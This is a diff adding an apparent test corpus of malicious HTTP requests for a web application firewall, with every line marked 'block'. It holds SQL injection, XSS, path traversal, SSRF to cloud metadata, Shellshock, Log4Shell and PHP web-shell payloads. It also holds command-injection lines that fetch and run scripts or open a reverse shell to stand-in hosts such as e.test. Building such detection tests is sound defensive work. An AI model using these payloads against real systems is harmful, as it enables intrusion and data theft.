@@ -1,0 +1,68 @@
+# Attack corpus (PK-152): every line must score over the default threshold.
+# Written from public attack shapes. Each class has at least five lines.
+{"method":"GET","path":"/","query":"q=1'+union+select+password+from+users--","expect":"block","note":"sqli"}
+{"method":"GET","path":"/","query":"q=1+union+all+select+null,null,null","expect":"block","note":"sqli"}
+{"method":"GET","path":"/","query":"q='+or+1=1--","expect":"block","note":"sqli"}
+{"method":"GET","path":"/","query":"q=admin'--","expect":"block","note":"sqli"}
+{"method":"GET","path":"/","query":"q=1'+and+sleep(5)--","expect":"block","note":"sqli"}
+{"method":"GET","path":"/","query":"q=1;+drop+table+users","expect":"block","note":"sqli"}
+{"method":"GET","path":"/","query":"id=1+and+1=1","expect":"block","note":"sqli"}
+{"method":"GET","path":"/","query":"q=x'+or+'a'='a","expect":"block","note":"sqli"}
+{"method":"GET","path":"/","query":"q=select+table_name+from+information_schema.tables","expect":"block","note":"sqli"}
+{"method":"GET","path":"/","query":"q=1+and+benchmark(1000000,md5(1))","expect":"block","note":"sqli"}
+{"method":"GET","path":"/","query":"q=1;+waitfor+delay+'0:0:5'--","expect":"block","note":"sqli"}
+{"method":"GET","path":"/","query":"q=extractvalue(1,concat(0x7e,version()))","expect":"block","note":"sqli"}
+{"method":"GET","path":"/","query":"q=<script>alert(1)</script>","expect":"block","note":"xss"}
+{"method":"GET","path":"/","query":"q=<img+src=x+onerror=alert(1)>","expect":"block","note":"xss"}
+{"method":"GET","path":"/","query":"url=javascript:alert(1)","expect":"block","note":"xss"}
+{"method":"GET","path":"/","query":"q=<svg+onload=alert(1)>","expect":"block","note":"xss"}
+{"method":"GET","path":"/","query":"q=<iframe+src=//evil.test>","expect":"block","note":"xss"}
+{"method":"GET","path":"/","query":"q=\"><script+src=//e.test/x.js></script>","expect":"block","note":"xss"}
+{"method":"GET","path":"/","query":"q=<body+onload=alert(1)>","expect":"block","note":"xss"}
+{"method":"GET","path":"/","query":"q=<div+srcdoc=\"<script>x</script>\">","expect":"block","note":"xss"}
+{"method":"GET","path":"/files/../../../etc/passwd","expect":"block","note":"traversal"}
+{"method":"GET","path":"/","query":"file=../../../etc/passwd","expect":"block","note":"traversal"}
+{"method":"GET","path":"/","query":"file=....//....//etc/passwd","expect":"block","note":"traversal"}
+{"method":"GET","path":"/","query":"file=/proc/self/environ","expect":"block","note":"traversal"}
+{"method":"GET","path":"/","query":"file=c:\\windows\\win.ini","expect":"block","note":"traversal"}
+{"method":"GET","path":"/","query":"page=..%2f..%2f..%2fetc%2fshadow","expect":"block","note":"traversal"}
+{"method":"GET","path":"/download","query":"name=..\\..\\boot.ini","expect":"block","note":"traversal"}
+{"method":"GET","path":"/","query":"url=file:///etc/passwd","expect":"block","note":"rfi-ssrf"}
+{"method":"GET","path":"/","query":"url=gopher://127.0.0.1:6379/_","expect":"block","note":"rfi-ssrf"}
+{"method":"GET","path":"/","query":"url=http://169.254.169.254/latest/meta-data/","expect":"block","note":"rfi-ssrf"}
+{"method":"GET","path":"/","query":"url=dict://localhost:11211/stats","expect":"block","note":"rfi-ssrf"}
+{"method":"GET","path":"/","query":"url=ldap://evil.test/a","expect":"block","note":"rfi-ssrf"}
+{"method":"GET","path":"/","query":"url=http://metadata.google.internal/computeMetadata/v1/","expect":"block","note":"rfi-ssrf"}
+{"method":"GET","path":"/","query":"cmd=;+wget+http://e.test/x.sh","expect":"block","note":"rce"}
+{"method":"GET","path":"/","query":"q=|+bash+-i","expect":"block","note":"rce"}
+{"method":"GET","path":"/","query":"q=`curl+http://e.test/x|sh`","expect":"block","note":"rce"}
+{"method":"GET","path":"/","query":"q=$(whoami)","expect":"block","note":"rce"}
+{"method":"GET","path":"/","query":"q=;nc+-e+/bin/sh+e.test+4444","expect":"block","note":"rce"}
+{"method":"GET","path":"/","query":"q=/bin/sh+-c+id","expect":"block","note":"rce"}
+{"method":"GET","path":"/","query":"q=cmd.exe+/c+dir","expect":"block","note":"rce"}
+{"method":"GET","path":"/","query":"q=powershell+-enc+AAAA","expect":"block","note":"rce"}
+{"method":"GET","path":"/","query":"q=cat${IFS}/etc/passwd","expect":"block","note":"rce"}
+{"method":"GET","path":"/","headers":{"X-Test":"() { :;}; /bin/bash -c id"},"expect":"block","note":"shellshock"}
+{"method":"POST","path":"/","headers":{"Content-Type":"text/plain"},"body":"<?php system($_GET['c']); ?>","expect":"block","note":"php"}
+{"method":"GET","path":"/","query":"page=php://input","expect":"block","note":"php"}
+{"method":"GET","path":"/","query":"page=data://text/plain;base64,AAAA","expect":"block","note":"php"}
+{"method":"GET","path":"/","query":"x=eval(base64_decode($_POST[1]))","expect":"block","note":"php"}
+{"method":"GET","path":"/","query":"page=phar://x.phar/a","expect":"block","note":"php"}
+{"method":"GET","path":"/","query":"page=expect://id","expect":"block","note":"php"}
+{"method":"GET","path":"/","headers":{"X-Api-Version":"${jndi:ldap://e.test/a}"},"expect":"block","note":"log4shell"}
+{"method":"GET","path":"/","headers":{"X-Api-Version":"${${lower:j}ndi:ldap://e.test/a}"},"expect":"block","note":"log4shell"}
+{"method":"GET","path":"/","headers":{"X-Api-Version":"${${::-j}${::-n}di:ldap://e.test/a}"},"expect":"block","note":"log4shell"}
+{"method":"GET","path":"/","headers":{"Cookie":"sid=${jndi:ldap://e.test/a}"},"expect":"block","note":"log4shell"}
+{"method":"POST","path":"/","headers":{"Content-Type":"application/json"},"body":"{\"user\":\"${jndi:dns://e.test/a}\"}","expect":"block","note":"log4shell"}
+{"method":"GET","path":"/","query":"class.module.classLoader.resources.context.parent.pipeline.first.pattern=x","expect":"block","note":"spring4shell"}
+{"method":"GET","path":"/","query":"q=%{(#_memberAccess=1)}","expect":"block","note":"ognl"}
+{"method":"POST","path":"/","headers":{"Content-Type":"application/xml"},"body":"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><a>&xxe;</a>","expect":"block","note":"xxe"}
+{"method":"POST","path":"/up","headers":{"Content-Type":"multipart/form-data; boundary=B"},"body":"--B\r\nContent-Disposition: form-data; name=\"f\"; filename=\"shell.php\"\r\nContent-Type: application/octet-stream\r\n\r\nxx\r\n--B--\r\n","expect":"block","note":"upload"}
+{"method":"POST","path":"/up","headers":{"Content-Type":"multipart/form-data; boundary=B"},"body":"--B\r\nContent-Disposition: form-data; name=\"f\"; filename=\"a.php.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nxx\r\n--B--\r\n","expect":"block","note":"upload"}
+{"method":"POST","path":"/up","headers":{"Content-Type":"multipart/form-data; boundary=B"},"body":"--B\r\nContent-Disposition: form-data; name=\"f\"; filename=\"../../x.png\"\r\nContent-Type: image/png\r\n\r\nxx\r\n--B--\r\n","expect":"block","note":"upload"}
+{"method":"POST","path":"/up","headers":{"Content-Type":"multipart/form-data; boundary=B"},"body":"--B\r\nContent-Disposition: form-data; name=\"f\"; filename=\"payload.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\nxx\r\n--B--\r\n","expect":"block","note":"upload"}
+{"method":"POST","path":"/up","headers":{"Content-Type":"multipart/form-data; boundary=B"},"body":"--B\r\nContent-Disposition: form-data; name=\"f\"; filename=\"evil.exe\"\r\nContent-Type: application/octet-stream\r\n\r\nxx\r\n--B--\r\n","expect":"block","note":"upload"}
+{"method":"POST","path":"/login","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"user=admin'--&pw=x","expect":"block","note":"sqli-body"}
+{"method":"POST","path":"/api","headers":{"Content-Type":"application/json"},"body":"{\"q\":{\"$where\":\"1' union select 1\"}}","expect":"block","note":"sqli-json"}
+{"method":"POST","path":"/api","headers":{"Content-Type":"application/json"},"body":"{\"items\":[{\"name\":\"<script>alert(1)</script>\"}]}","expect":"block","note":"xss-json"}
+{"method":"GET","path":"/a;jsessionid=abc","query":"q=1+and+1=1","expect":"block","note":"session-fixation-plus-sqli"}
